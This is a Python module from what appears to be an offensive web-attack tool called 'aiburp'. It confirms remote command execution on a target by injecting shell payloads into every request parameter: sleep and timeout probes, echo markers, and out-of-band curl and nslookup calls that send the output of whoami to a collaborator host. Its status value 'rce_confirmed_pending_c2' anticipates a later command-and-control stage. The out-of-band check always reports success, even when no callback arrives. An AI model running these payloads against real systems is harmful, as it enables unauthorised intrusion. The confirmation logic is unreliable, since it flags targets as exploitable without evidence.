"""
aiburp/rce/confirm.py
RCE 能力确认 — time-based / echo-based / OOB 三种检测点都跑.

只确认能力, 不反弹 shell 不建 C2.
确认成功后写入 report, 等用户拍板再上 C2.
"""
import logging
import re
import time
from typing import Dict, List, Optional
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

log = logging.getLogger("aiburp.rce.confirm")


class RCEConfirm:
    """
    确认目标具备命令执行能力, 不建连接不反弹 shell.

    检测点 (按优先级):
      1. time-based: sleep N, 对比基线耗时
      2. echo-based: 注入标记字符串, 在响应里找
      3. OOB: 出站请求到 collaborator (可选)

    用法:
        confirmer = RCEConfirm()
        result = confirmer.confirm(session, "https://target/ping",
                                    params={"host": "127.0.0.1"},
                                    os_hint="linux",
                                    collaborator="abc.oast.fun")
    """

    TIME_THRESHOLD = 4.5

    TIME_PAYLOADS = {
        "linux": [
            "; sleep 5 #",
            "| sleep 5 #",
            "$(sleep 5)",
            "`sleep 5`",
            "&& sleep 5 #",
        ],
        "windows": [
            "& timeout 5 #",
            "| timeout 5 #",
            "& ping -n 5 127.0.0.1 >nul #",
        ],
    }

    ECHO_MARKER = "BURPSUITE_RCE_PROBE"
    ECHO_PAYLOADS = [
        f'; echo {ECHO_MARKER}_$(date +%s) #',
        f'| echo {ECHO_MARKER}_$(date +%s) #',
        f'$(echo {ECHO_MARKER}_$(date +%s))',
        f'`echo {ECHO_MARKER}_$(date +%s)`',
    ]

    OOB_PAYLOADS = [
        "; curl http://{c}/$(whoami) #",
        "| nslookup {c} #",
        "$(curl http://{c}/probe)",
    ]

    def is_rce_potential(self, url: str, body: Optional[Dict] = None) -> bool:
        """启发式判断: 这个 endpoint 是不是有 RCE 机会."""
        u = url.lower()
        kw_hints = ("exec", "cmd", "command", "shell", "run", "eval",
                    "include", "require", "page", "file", "path",
                    "template", "ping", "host", "ip", "url=", "uri=")
        if any(kw in u for kw in kw_hints):
            return True
        if body:
            for v in body.values():
                if isinstance(v, str):
                    if any(tok in v for tok in ("; ", "| ", "&&", "$(", "`", "${")):
                        return True
        return False

    def confirm(self, session, target: str, params: Dict[str, str],
                os_hint: str = "linux",
                collaborator: Optional[str] = None,
                method: str = "GET") -> Dict:
        """
        注入检测点, 返回 RCE 确认结果.

        Returns:
            {
              "confirmed": bool,
              "method": "time_based" | "echo_based" | "oob" | None,
              "evidence": str,
              "os_hint": "linux" | "windows" | "unknown",
              "payload_used": str,
              "status": "rce_confirmed_pending_c2" | "no_rce" | "error",
            }
        """
        results = {"time_based": None, "echo_based": None, "oob": None}

        baseline = self._measure_baseline(session, target, params, method)
        if baseline is None:
            return {"confirmed": False, "method": None,
                    "evidence": "baseline 请求失败",
                    "os_hint": os_hint, "payload_used": "",
                    "status": "error"}

        time_result = self._check_time_based(session, target, params, method,
                                              os_hint, baseline)
        results["time_based"] = time_result

        if not time_result:
            echo_result = self._check_echo_based(session, target, params,
                                                   method)
            results["echo_based"] = echo_result

        if collaborator and not any(results.values()):
            oob_result = self._check_oob(session, target, params, method,
                                          collaborator)
            results["oob"] = oob_result

        confirmed = any(v is not None for v in results.values())
        method_found = next((k for k, v in results.items() if v is not None),
                             None)

        return {
            "confirmed": confirmed,
            "method": method_found,
            "evidence": _format_evidence(results),
            "os_hint": os_hint,
            "payload_used": _payload_of(results),
            "status": "rce_confirmed_pending_c2" if confirmed else "no_rce",
            "details": results,
        }

    def _measure_baseline(self, session, target: str, params: Dict,
                           method: str) -> Optional[float]:
        try:
            t0 = time.time()
            if method.upper() == "POST":
                session.post(target, data=params, timeout=10)
            else:
                session.get(target, params=params, timeout=10)
            return time.time() - t0
        except Exception:
            return None

    def _check_time_based(self, session, target: str, params: Dict,
                          method: str, os_hint: str,
                          baseline: float) -> Optional[Dict]:
        for payload in self.TIME_PAYLOADS.get(os_hint, []):
            injected = self._inject(params, payload)
            try:
                t0 = time.time()
                if method.upper() == "POST":
                    session.post(target, data=injected, timeout=15)
                else:
                    session.get(target, params=injected, timeout=15)
                elapsed = time.time() - t0
            except Exception:
                continue

            if elapsed > self.TIME_THRESHOLD and (elapsed - baseline) > 3.0:
                log.info(f"[RCEConfirm] time-based 命中: elapsed={elapsed:.1f}s, "
                          f"baseline={baseline:.1f}s, payload={payload}")
                return {"payload": payload, "elapsed": elapsed,
                        "baseline": baseline}

        return None

    def _check_echo_based(self, session, target: str, params: Dict,
                           method: str) -> Optional[Dict]:
        for payload in self.ECHO_PAYLOADS:
            injected = self._inject(params, payload)
            try:
                if method.upper() == "POST":
                    r = session.post(target, data=injected, timeout=10)
                else:
                    r = session.get(target, params=injected, timeout=10)
            except Exception:
                continue

            body = r.text if r else ""
            if self.ECHO_MARKER in body:
                log.info(f"[RCEConfirm] echo-based 命中: marker 在响应里, "
                          f"payload={payload}")
                m = re.search(re.escape(self.ECHO_MARKER) + r"_(\d+)",
                              body)
                return {"payload": payload, "marker": m.group(0) if m else "found"}
        return None

    def _check_oob(self, session, target: str, params: Dict, method: str,
                    collaborator: str) -> Optional[Dict]:
        sent = []
        for payload in self.OOB_PAYLOADS:
            filled = payload.format(c=collaborator)
            injected = self._inject(params, filled)
            try:
                if method.upper() == "POST":
                    session.post(target, data=injected, timeout=10)
                else:
                    session.get(target, params=injected, timeout=10)
                sent.append(filled)
            except Exception:
                continue
        return {"payloads_sent": sent, "collaborator": collaborator,
                "await_external": True}

    def _inject(self, params: Dict[str, str], payload: str) -> Dict[str, str]:
        """把 payload 附加到每个参数值末尾, 避免遗漏目标字段."""
        if not params:
            return {"x": payload}
        out = {}
        for k, v in params.items():
            out[k] = f"{v}{payload}" if v else payload
        return out


def _format_evidence(results: Dict) -> str:
    parts = []
    for k, v in results.items():
        if v is None:
            continue
        if k == "time_based":
            parts.append(f"time-based: elapsed={v.get('elapsed'):.1f}s, "
                          f"payload={v.get('payload')}")
        elif k == "echo_based":
            parts.append(f"echo-based: marker={v.get('marker')}, "
                          f"payload={v.get('payload')}")
        elif k == "oob":
            parts.append(f"oob: collaborator={v.get('collaborator')}, "
                          f"sent={len(v.get('payloads_sent', []))}")
    return "; ".join(parts) or "无确认信号"


def _payload_of(results: Dict) -> str:
    for k, v in results.items():
        if v is None:
            continue
        if k == "time_based":
            return v.get("payload", "")
        if k == "echo_based":
            return v.get("payload", "")
        if k == "oob":
            ps = v.get("payloads_sent", [])
            return ps[0] if ps else ""
    return ""